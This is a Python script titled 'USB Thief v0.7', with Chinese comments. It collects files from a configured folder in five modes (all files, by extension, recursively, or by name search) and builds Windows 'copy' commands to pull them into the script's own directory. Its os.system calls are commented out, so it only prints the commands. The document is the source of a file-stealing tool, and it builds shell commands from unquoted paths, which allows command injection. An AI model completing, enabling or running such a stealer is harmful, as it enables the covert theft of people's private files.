# USB Thief v0.7

import os
from Get_FilesAndDoc import Get_FilesPath,Get_AllFiles
from Check_ini import CheckPath
from Check_file import Check_file,NameCheck


LocalPath = os.getcwd()

# 获取本脚本的运行路径并指定为配置文件以及复制文件的保存路径

Setting,TargetEnd,TarFile_Name = CheckPath()
CopyPath = Setting[0]
Mix_GB = int(Setting[1]) * 104857
Copy_Choice = int(Setting[2])

if Copy_Choice == 1:

# 目标文件夹的所有文件提取
    FilesPath = Get_FilesPath(CopyPath,Mix_GB)

    for SingleFile in FilesPath:
        Command = 'copy ' + SingleFile + ' ' + LocalPath
        print(Command)
#        try:           
#            os.system(Command)
#        except:
#            continue
elif Copy_Choice == 2:

# 目标文件夹的特定文件提取
    FilesPath = Get_FilesPath(CopyPath,Mix_GB)
    FilesList = Check_file(FilesPath,TargetEnd)
    for SingleFile in FilesList:
        Command = 'copy ' + SingleFile + ' ' + LocalPath
        print(Command)
#        try:
#            os.system(Command)
#        except:
#            continue
elif Copy_Choice == 3:

# 目标文件夹及其子文件夹的所有文件提取
    FilesPath = Get_AllFiles(CopyPath,Mix_GB)
    for SingleFile in FilesPath:
        Command = 'copy ' + SingleFile + ' ' + LocalPath
        print(Command)
#        try:           
#            os.system(Command)
#        except:
#            continue
elif Copy_Choice == 4:

# 目标文件夹及其子文件夹的特定文件提取
    FilesPath = Get_AllFiles(CopyPath,Mix_GB)
    FilesList = Check_file(FilesPath,TargetEnd)
    for SingleFile in FilesList:
        Command = 'copy ' + SingleFile + ' ' + LocalPath
        print(Command)
#        try:
#            os.system(Command)
#        except:
#            continue
elif Copy_Choice == 5:

# 精确搜索和模糊搜索TarFile_Name
    FilesPath = Get_AllFiles(CopyPath,Mix_GB)
    FilesList = NameCheck(FilesPath,TarFile_Name)
    for SingleFile in FilesList:
        Command = 'copy ' + SingleFile + ' ' + LocalPath
        print(Command)
#        try:
#            os.system(Command)
#        except:
#            continue
# cmd 的 copy 命令 copy 文件路径 目标路径